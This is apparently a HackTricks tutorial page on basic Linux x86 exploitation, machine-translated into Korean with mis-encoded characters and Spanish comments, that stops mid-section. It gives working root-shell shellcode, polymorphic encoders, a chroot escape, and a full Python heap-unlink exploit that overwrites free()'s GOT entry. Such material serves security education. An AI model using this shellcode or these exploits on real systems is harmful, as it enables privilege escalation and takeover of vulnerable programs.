# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

ì»¤ë„ ì¸í„°ëŸ½ì…˜ ë³´ê¸°: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax ì´ˆê¸°í™”\
xor ebx, ebx ; ebx = 0, ì¸ìê°€ ì—†ìœ¼ë¯€ë¡œ\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; ì‹œìŠ¤í…œ í˜¸ì¶œ ì‹¤í–‰

**nasm -f elf assembly.asm** â€”> .o íŒŒì¼ ë°˜í™˜\
**ld assembly.o -o shellcodeout** â€”> ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¡œ êµ¬ì„±ëœ ì‹¤í–‰ íŒŒì¼ ìƒì„±, **objdump**ë¡œ opcodes ì¶”ì¶œ ê°€ëŠ¥\
**objdump -d -Mintel ./shellcodeout** â€”> ì‹¤ì œë¡œ ìš°ë¦¬ì˜ shellcodeì¸ì§€ í™•ì¸í•˜ê³  OpCodes ì¶”ì¶œ

**shellcodeê°€ ì‘ë™í•˜ëŠ”ì§€ í™•ì¸**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
ì‹œìŠ¤í…œ í˜¸ì¶œì´ ì˜¬ë°”ë¥´ê²Œ ìˆ˜í–‰ë˜ëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´ ì´ì „ í”„ë¡œê·¸ë¨ì„ ì»´íŒŒì¼í•´ì•¼ í•˜ë©° ì‹œìŠ¤í…œ í˜¸ì¶œì€ **strace ./PROGRAMA\_COMPILADO**ì— ë‚˜íƒ€ë‚˜ì•¼ í•©ë‹ˆë‹¤.

ì‰˜ì½”ë“œë¥¼ ìƒì„±í•  ë•Œ íŠ¸ë¦­ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì²« ë²ˆì§¸ ëª…ë ¹ì–´ëŠ” callë¡œ ì í”„í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. callì€ ì›ë˜ ì½”ë“œë¥¼ í˜¸ì¶œí•˜ê³  EIPë¥¼ ìŠ¤íƒì— ë„£ìŠµë‹ˆë‹¤. call ëª…ë ¹ì–´ ì´í›„ì— í•„ìš”í•œ ë¬¸ìì—´ì„ ë„£ì—ˆìœ¼ë¯€ë¡œ, ì´ EIPë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ìì—´ì„ ê°€ë¦¬í‚¤ê³  ì½”ë“œë¥¼ ê³„ì† ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**EJ ìŠ¤íƒ ì‚¬ìš©(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Huter:**

í”„ë¡œì„¸ìŠ¤ì™€ ì—°ê²°ëœ ë©”ëª¨ë¦¬ í˜ì´ì§€ë¥¼ ìˆœíšŒí•˜ì—¬ ê±°ê¸°ì— ì €ì¥ëœ shellcodeë¥¼ ì°¾ëŠ” ì‘ì€ ì½”ë“œë¡œ êµ¬ì„±ë©ë‹ˆë‹¤(ì—¬ê¸°ì„œ shellcodeì— ì„¤ì •ëœ ì„œëª…ì„ ì°¾ìŠµë‹ˆë‹¤). ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆëŠ” ê³µê°„ì´ ì ì€ ê²½ìš°ì— ìœ ìš©í•©ë‹ˆë‹¤.

**Shellcodes polimÃ³rficos**

ì•”í˜¸í™”ëœ shellë¡œ êµ¬ì„±ë˜ë©°, ì´ë¥¼ í•´ë…í•˜ê³  ì í”„í•˜ëŠ” ì‘ì€ ì½”ë“œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. Call-Pop íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ì—¬, ì´ê²ƒì€ **ì˜ˆì‹œ ì•”í˜¸í™”ëœ cesar**ì…ë‹ˆë‹¤:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. ë³´ì™„ ë°©ë²•**

**ë¬´ë¼íŠ¸ ê¸°ë²•**

ë¦¬ëˆ…ìŠ¤ì—ì„œ ëª¨ë“  í”„ë¡œê·¸ë¨ì€ 0xbfffffffì—ì„œ ì‹œì‘í•˜ì—¬ ë§¤í•‘ë©ë‹ˆë‹¤.

ë¦¬ëˆ…ìŠ¤ì—ì„œ ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ì˜ ìŠ¤íƒì´ ì–´ë–»ê²Œ êµ¬ì„±ë˜ëŠ”ì§€ë¥¼ ë³´ë©´, í”„ë¡œê·¸ë¨ì´ shellcodeë§Œ ìˆëŠ” í™˜ê²½ì—ì„œ ì‹œì‘ë˜ë„ë¡ exploitë¥¼ ê°œë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì£¼ì†ŒëŠ” ë‹¤ìŒê³¼ ê°™ì´ ê³„ì‚°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: addr = 0xbfffffff - 4 - strlen(ì „ì²´_ì‹¤í–‰íŒŒì¼_ì´ë¦„) - strlen(shellcode)

ì´ë ‡ê²Œ í•˜ë©´ shellcodeê°€ ìˆëŠ” í™˜ê²½ ë³€ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì‰½ê²Œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŠ” execle í•¨ìˆ˜ê°€ ì›í•˜ëŠ” í™˜ê²½ ë³€ìˆ˜ë§Œ í¬í•¨ëœ í™˜ê²½ì„ ìƒì„±í•  ìˆ˜ ìˆê²Œ í•´ì£¼ê¸° ë•Œë¬¸ì— ê°€ëŠ¥í•©ë‹ˆë‹¤.

### **ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ìœ„í•œ í¬ë§· ë¬¸ìì—´**

**sprintf**ëŠ” í¬ë§·ëœ ë¬¸ìì—´ì„ **ë³€ìˆ˜ë¡œ** ì´ë™ì‹œí‚µë‹ˆë‹¤. ë”°ë¼ì„œ ë¬¸ìì—´ì˜ **í¬ë§·íŒ…**ì„ ì•…ìš©í•˜ì—¬ **ë‚´ìš©ì´ ë³µì‚¬ë˜ëŠ” ë³€ìˆ˜ì—ì„œ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
ì˜ˆë¥¼ ë“¤ì–´, í˜ì´ë¡œë“œ `%.44xAAAA`ëŠ” **ë³€ìˆ˜ì— 44B+"AAAA"ë¥¼ ì”ë‹ˆë‹¤**, ì´ëŠ” ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **\_\_atexit êµ¬ì¡°ì²´**

{% hint style="danger" %}
í˜„ì¬ëŠ” ì´ë¥¼ **ì•…ìš©í•˜ê¸° ë§¤ìš° ì–´ë µìŠµë‹ˆë‹¤**.
{% endhint %}

**`atexit()`**ëŠ” **ë‹¤ë¥¸ í•¨ìˆ˜ë“¤ì´ ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬ë˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤.** ì´ **í•¨ìˆ˜ë“¤**ì€ **`exit()`**ë¥¼ ì‹¤í–‰í•˜ê±°ë‚˜ **main**ì˜ **return** ì‹œì— **ì‹¤í–‰ë©ë‹ˆë‹¤**.\
ì´ëŸ¬í•œ **í•¨ìˆ˜ë“¤** ì¤‘ í•˜ë‚˜ì˜ **ì£¼ì†Œ**ë¥¼ shellcodeë¥¼ ê°€ë¦¬í‚¤ë„ë¡ **ìˆ˜ì •**í•  ìˆ˜ ìˆë‹¤ë©´, **í”„ë¡œì„¸ìŠ¤ì˜ ì œì–´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**, í•˜ì§€ë§Œ í˜„ì¬ëŠ” ë” ë³µì¡í•©ë‹ˆë‹¤.\
í˜„ì¬ ì‹¤í–‰ë  **í•¨ìˆ˜ë“¤ì˜ ì£¼ì†Œ**ëŠ” ì—¬ëŸ¬ êµ¬ì¡° ë’¤ì— **ìˆ¨ê²¨ì ¸** ìˆìœ¼ë©°, ìµœì¢…ì ìœ¼ë¡œ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†ŒëŠ” í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ ì•„ë‹ˆë¼ **XORë¡œ ì•”í˜¸í™”**ë˜ê³  **ë¬´ì‘ìœ„ í‚¤**ë¡œ ì´ë™ë©ë‹ˆë‹¤. ë”°ë¼ì„œ í˜„ì¬ ì´ ê³µê²© ë²¡í„°ëŠ” **x86** ë° **x64\_86**ì—ì„œëŠ” ê·¸ë‹¤ì§€ ìœ ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.\
**ì•”í˜¸í™” í•¨ìˆ˜**ëŠ” **`PTR_MANGLE`**ì…ë‹ˆë‹¤. **m68k, mips32, mips64, aarch64, arm, hppa**ì™€ ê°™ì€ **ë‹¤ë¥¸ ì•„í‚¤í…ì²˜**ëŠ” ì•”í˜¸í™” í•¨ìˆ˜ë¥¼ **êµ¬í˜„í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì™œëƒí•˜ë©´ ì´ í•¨ìˆ˜ëŠ” ì…ë ¥ìœ¼ë¡œ ë°›ì€ ê²ƒê³¼ **ê°™ì€ ê°’ì„ ë°˜í™˜í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤**. ë”°ë¼ì„œ ì´ëŸ¬í•œ ì•„í‚¤í…ì²˜ëŠ” ì´ ë²¡í„°ë¡œ ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **setjmp() & longjmp()**

{% hint style="danger" %}
í˜„ì¬ëŠ” ì´ë¥¼ **ì•…ìš©í•˜ê¸° ë§¤ìš° ì–´ë µìŠµë‹ˆë‹¤**.
{% endhint %}

**`setjmp()`**ëŠ” **ì»¨í…ìŠ¤íŠ¸**(ë ˆì§€ìŠ¤í„°)ë¥¼ **ì €ì¥**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.\
**`longjmp()`**ëŠ” **ì»¨í…ìŠ¤íŠ¸**ë¥¼ **ë³µì›**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.\
**ì €ì¥ëœ ë ˆì§€ìŠ¤í„°**ëŠ”: `EBX, ESI, EDI, ESP, EIP, EBP`\
ë¬¸ì œëŠ” EIPì™€ ESPê°€ **`PTR_MANGLE`** í•¨ìˆ˜ì— ì˜í•´ ì „ë‹¬ëœë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ **ì´ ê³µê²©ì— ì·¨ì•½í•œ ì•„í‚¤í…ì²˜ëŠ” ìœ„ì™€ ë™ì¼í•©ë‹ˆë‹¤**.\
ì´ë“¤ì€ ì˜¤ë¥˜ ë³µêµ¬ë‚˜ ì¸í„°ëŸ½íŠ¸ì— ìœ ìš©í•©ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì œê°€ ì½ì€ ë°”ì— ë”°ë¥´ë©´, ë‹¤ë¥¸ ë ˆì§€ìŠ¤í„°ëŠ” ë³´í˜¸ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ, **í•¨ìˆ˜ ë‚´ì—ì„œ `call ebx`, `call esi` ë˜ëŠ” `call edi`**ê°€ ìˆë‹¤ë©´ ì œì–´ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜ëŠ” EBPë¥¼ ìˆ˜ì •í•˜ì—¬ ESPë¥¼ ìˆ˜ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

**C++ì˜ VTable ë° VPTR**

ê° í´ë˜ìŠ¤ëŠ” **ë©”ì„œë“œì— ëŒ€í•œ í¬ì¸í„° ë°°ì—´**ì¸ **Vtable**ì„ ê°€ì§‘ë‹ˆë‹¤.

ê° **í´ë˜ìŠ¤**ì˜ ê°ì²´ëŠ” **VPtr**ì„ ê°€ì§€ë©°, ì´ëŠ” í•´ë‹¹ í´ë˜ìŠ¤ì˜ ë°°ì—´ì— ëŒ€í•œ **í¬ì¸í„°**ì…ë‹ˆë‹¤. VPtrì€ ê° ê°ì²´ì˜ í—¤ë”ì˜ ì¼ë¶€ì´ë¯€ë¡œ, **VPtr**ì„ **ìˆ˜ì •**í•˜ì—¬ **ë”ë¯¸ ë©”ì„œë“œë¥¼ ê°€ë¦¬í‚¤ë„ë¡ í•˜ë©´** í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ë•Œ shellcodeë¡œ ì´ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## **ì˜ˆë°© ì¡°ì¹˜ ë° íšŒí”¼ ë°©ë²•**

**Libsafe ëŒ€ì²´**

ë‹¤ìŒê³¼ ê°™ì´ í™œì„±í™”ë©ë‹ˆë‹¤: LD\_PRELOAD=/lib/libsafe.so.2\
ë˜ëŠ”\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

ì•ˆì „í•˜ì§€ ì•Šì€ ì¼ë¶€ í•¨ìˆ˜ í˜¸ì¶œì„ ì•ˆì „í•œ ë‹¤ë¥¸ í•¨ìˆ˜ë¡œ ê°€ë¡œì±•ë‹ˆë‹¤. í‘œì¤€í™”ë˜ì–´ ìˆì§€ ì•ŠìŠµë‹ˆë‹¤. (x86 ì „ìš©, -fomit-frame-pointerë¡œ ì»´íŒŒì¼ëœ ê²½ìš°, ì •ì  ì»´íŒŒì¼ì´ ì•„ë‹Œ ê²½ìš°, ëª¨ë“  ì·¨ì•½í•œ í•¨ìˆ˜ê°€ ì•ˆì „í•´ì§€ì§€ ì•Šìœ¼ë©° LD\_PRELOADëŠ” suidê°€ ìˆëŠ” ë°”ì´ë„ˆë¦¬ì—ì„œëŠ” ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤).

**ASCII ë°©ì–´ ì£¼ì†Œ ê³µê°„**

0x00000000ì—ì„œ 0x00ffffffê¹Œì§€ ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¡œë“œí•˜ì—¬ í•­ìƒ 0x00 ë°”ì´íŠ¸ê°€ ìˆë„ë¡ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŠ” ì‹¤ì œë¡œ ê±°ì˜ ëª¨ë“  ê³µê²©ì„ ë§‰ì§€ ëª»í•˜ë©°, íŠ¹íˆ little endianì—ì„œëŠ” ë”ìš± ê·¸ë ‡ìŠµë‹ˆë‹¤.

**ret2plt**

ROPë¥¼ ìˆ˜í–‰í•˜ì—¬ strcpy@plt(pltì˜ í•¨ìˆ˜)ë¥¼ í˜¸ì¶œí•˜ê³  GOTì˜ í•­ëª©ì„ ê°€ë¦¬í‚¤ë©° í˜¸ì¶œí•˜ë ¤ëŠ” í•¨ìˆ˜(system())ì˜ ì²« ë²ˆì§¸ ë°”ì´íŠ¸ë¥¼ ë³µì‚¬í•©ë‹ˆë‹¤. ê·¸ ë‹¤ìŒ GOT+1ì„ ê°€ë¦¬í‚¤ë©° system()ì˜ ë‘ ë²ˆì§¸ ë°”ì´íŠ¸ë¥¼ ë³µì‚¬í•©ë‹ˆë‹¤... ë§ˆì§€ë§‰ìœ¼ë¡œ GOTì— ì €ì¥ëœ ì£¼ì†Œë¥¼ í˜¸ì¶œí•˜ì—¬ system()ì´ ë©ë‹ˆë‹¤.

**chroot()ë¥¼ ì´ìš©í•œ ìƒŒë“œë°•ìŠ¤**

debootstrap -arch=i386 hardy /home/user â€”> íŠ¹ì • í•˜ìœ„ ë””ë ‰í† ë¦¬ ì•„ë˜ì— ê¸°ë³¸ ì‹œìŠ¤í…œì„ ì„¤ì¹˜í•©ë‹ˆë‹¤.

ê´€ë¦¬ìëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì´ëŸ¬í•œ ìƒŒë“œë°•ìŠ¤ ì¤‘ í•˜ë‚˜ì—ì„œ ë‚˜ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤: mkdir foo; chroot foo; cd ..

**ì½”ë“œ ê³„ì¸¡**

Valgrind â€”> ì˜¤ë¥˜ ê²€ìƒ‰\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 í™ ì˜¤ë²„í”Œë¡œìš°: ê¸°ë³¸ ìµìŠ¤í”Œë¡œì‡**

**í• ë‹¹ëœ ì¡°ê°**

prev\_size |\
size | â€”í—¤ë”\
\*mem | ë°ì´í„°

**ììœ  ì¡°ê°**

prev\_size |\
size |\
\*fd | ë‹¤ìŒ ì¡°ê° í¬ì¸í„°\
\*bk | ì´ì „ ì¡°ê° í¬ì¸í„° â€”í—¤ë”\
\*mem | ë°ì´í„°

ììœ  ì¡°ê°ì€ ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸(bin)ì— ìˆìœ¼ë©°, ë‘ ê°œì˜ ììœ  ì¡°ê°ì´ í•¨ê»˜ ìˆì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤(ê²°í•©ë¨).

â€œsizeâ€ì—ëŠ” ë‹¤ìŒì„ ë‚˜íƒ€ë‚´ëŠ” ë¹„íŠ¸ê°€ ìˆìŠµë‹ˆë‹¤: ì´ì „ ì¡°ê°ì´ ì‚¬ìš© ì¤‘ì¸ì§€, mmap()ì„ í†µí•´ í• ë‹¹ë˜ì—ˆëŠ”ì§€, ì¡°ê°ì´ ê¸°ë³¸ ì•„ë ˆë‚˜ì— ì†í•˜ëŠ”ì§€.

ì¡°ê°ì„ í•´ì œí•  ë•Œ ì¸ì ‘í•œ ì¡°ê° ì¤‘ í•˜ë‚˜ê°€ ììœ ë¡œì›Œì§€ë©´, unlink() ë§¤í¬ë¡œë¥¼ í†µí•´ ê²°í•©ë˜ê³ , ë” í° ìƒˆ ì¡°ê°ì´ frontlink()ë¡œ ì „ë‹¬ë˜ì–´ ì ì ˆí•œ binì— ì‚½ì…ë©ë‹ˆë‹¤.

unlink(){\
BK = P->bk; â€”> ìƒˆ ì¡°ê°ì˜ BKëŠ” ì´ì „ì— ììœ ë¡œì› ë˜ ì¡°ê°ì˜ BKì…ë‹ˆë‹¤.\
FD = P->fd; â€”> ìƒˆ ì¡°ê°ì˜ FDëŠ” ì´ì „ì— ììœ ë¡œì› ë˜ ì¡°ê°ì˜ FDì…ë‹ˆë‹¤.\
FD->bk = BK; â€”> ë‹¤ìŒ ì¡°ê°ì˜ BKê°€ ìƒˆ ì¡°ê°ì„ ê°€ë¦¬í‚µë‹ˆë‹¤.\
BK->fd = FD; â€”> ì´ì „ ì¡°ê°ì˜ FDê°€ ìƒˆ ì¡°ê°ì„ ê°€ë¦¬í‚µë‹ˆë‹¤.\
}

ë”°ë¼ì„œ P->bkë¥¼ shellcodeì˜ ì£¼ì†Œë¡œ ìˆ˜ì •í•˜ê³  P->fdë¥¼ GOT ë˜ëŠ” DTORSì˜ ì£¼ì†Œ - 12ë¡œ ìˆ˜ì •í•˜ë©´:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

ì´ë ‡ê²Œ í•˜ë©´ í”„ë¡œê·¸ë¨ ì¢…ë£Œ ì‹œ shellcodeê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.

ë˜í•œ unlink()ì˜ 4ë²ˆì§¸ ë¬¸ì¥ì€ ë¬´ì–¸ê°€ë¥¼ ì“°ë©°, shellcodeëŠ” ì´ë¥¼ ìœ„í•´ ìˆ˜ì •ë˜ì–´ì•¼ í•©ë‹ˆë‹¤:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> ì´ëŠ” shellcodeì˜ 8ë²ˆì§¸ ë°”ì´íŠ¸ë¶€í„° 4ë°”ì´íŠ¸ë¥¼ ì“°ê²Œ í•˜ë¯€ë¡œ, shellcodeì˜ ì²« ë²ˆì§¸ ëª…ë ¹ì€ ì´ë¥¼ ê±´ë„ˆë›°ê³  ë‚˜ë¨¸ì§€ shellcodeë¡œ ì´ì–´ì§€ëŠ” jmpì´ì–´ì•¼ í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ ìµìŠ¤í”Œë¡œì‡ì€ ë‹¤ìŒê³¼ ê°™ì´ ìƒì„±ë©ë‹ˆë‹¤:

buffer1ì— shellcodeë¥¼ ë„£ê³  jmpë¡œ ì‹œì‘í•˜ì—¬ nops ë˜ëŠ” ë‚˜ë¨¸ì§€ shellcodeë¡œ ë–¨ì–´ì§€ê²Œ í•©ë‹ˆë‹¤.

shellcode ë’¤ì—ëŠ” prev\_sizeì™€ ë‹¤ìŒ ì¡°ê°ì˜ size í•„ë“œì— ë„ë‹¬í•  ë•Œê¹Œì§€ íŒ¨ë”©ì„ ë„£ìŠµë‹ˆë‹¤. ì´ ìœ„ì¹˜ì— 0xfffffff0ì„ ë„£ì–´ prev\_sizeê°€ ììœ ë¡œì›€ì„ ë‚˜íƒ€ë‚´ë„ë¡ í•˜ê³ , sizeì— â€œ-4â€(0xfffffffc)ë¥¼ ë„£ìŠµë‹ˆë‹¤ (ì´ë ‡ê²Œ í•˜ë©´ 3ë²ˆì§¸ ì¡°ê°ì—ì„œ 2ë²ˆì§¸ ì¡°ê°ì´ ì‹¤ì œë¡œ ììœ ë¡œì› ëŠ”ì§€ í™•ì¸í•  ë•Œ ìˆ˜ì •ëœ prev\_sizeë¡œ ê°€ê²Œ ë©ë‹ˆë‹¤) -> ì´ë ‡ê²Œ í•˜ë©´ free()ê°€ ì¡°ì‚¬í•  ë•Œ 3ë²ˆì§¸ ì¡°ê°ì˜ sizeë¡œ ê°€ì§€ë§Œ ì‹¤ì œë¡œëŠ” 2ë²ˆì§¸ ì¡°ê° - 4ë¡œ ê°€ì„œ 2ë²ˆì§¸ ì¡°ê°ì´ ììœ ë¡­ë‹¤ê³  ìƒê°í•˜ê²Œ ë©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ê·¸ëŸ¬ë©´ **unlink()**ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

unlink()ë¥¼ í˜¸ì¶œí•  ë•Œ P->fdëŠ” 2ë²ˆì§¸ ì¡°ê°ì˜ ì²« ë²ˆì§¸ ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ, ì—¬ê¸°ì—ëŠ” ë®ì–´ì“°ë ¤ëŠ” ì£¼ì†Œ - 12(ì™œëƒí•˜ë©´ FD->bkì— 12ë¥¼ ë”í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤)ë¡œ ë“¤ì–´ê°€ê²Œ ë©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ê·¸ ì£¼ì†Œì— 2ë²ˆì§¸ ì¡°ê°ì—ì„œ ì°¾ì€ ë‘ ë²ˆì§¸ ì£¼ì†Œë¥¼ ë„£ê²Œ ë˜ë©°, ì´ëŠ” shellcodeì˜ ì£¼ì†Œì—¬ì•¼ í•©ë‹ˆë‹¤(P->bk ê°€ì§œ).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytesì˜ íŒ¨ë”©**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #ì´ì „ ì¡°ê°ì´ ììœ ë¡œì›€ì„ ë‚˜íƒ€ë‚´ëŠ” ë¹„íŠ¸ê°€ 1ì´ ë˜ë„ë¡ í•©ë‹ˆë‹¤.**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, 3ë²ˆì§¸ ì¡°ê°ì˜ sizeê°€ 4ë°”ì´íŠ¸ ë’¤ì— ìˆë‹¤ê³  ìƒê°í•˜ê²Œ í•˜ì—¬ prev\_sizeë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤.**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #í˜ì´ë¡œë“œì˜ ì²˜ìŒì— 8ë°”ì´íŠ¸ì˜ íŒ¨ë”©ì„ ë„£ìŠµë‹ˆë‹¤.**

**got\_free = pack("\<I", 0x08048300 - 12) #free()ì˜ pltì—ì„œì˜ ì£¼ì†Œ -12 (ì´ ì£¼ì†Œê°€ shellcodeë¥¼ ì‹¤í–‰í•˜ë„ë¡ ë®ì–´ì”Œì›Œì§ˆ ê²ƒì…ë‹ˆë‹¤).**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #í˜ì´ë¡œë“œëŠ” 8ë°”ì´íŠ¸ì˜ íŒ¨ë”©ìœ¼ë¡œ ì‹œì‘í•©ë‹ˆë‹¤.**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2ë²ˆì§¸ ì¡°ê°ì„ ìˆ˜ì •í•˜ê³ , got\_freeëŠ” addr\_sc + 12ì˜ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤.**

**os.system("./8.3.o " + payload)**

**unset() ì—­ë°©í–¥ìœ¼ë¡œ í•´ì œí•˜ê¸° (wargame)**

ìš°ë¦¬ëŠ” 3ê°œì˜ ì—°ì† ì¡°ê°ì„ ì œì–´í•˜ê³  ìˆìœ¼ë©°, ì´ë“¤ì€ ì˜ˆì•½ëœ ìˆœì„œì˜ ì—­ìˆœìœ¼ë¡œ í•´ì œë©ë‹ˆë‹¤.

ì´ ê²½ìš°:

ì¡°ê° cì— shellcodeë¥¼ ë„£ìŠµë‹ˆë‹¤.

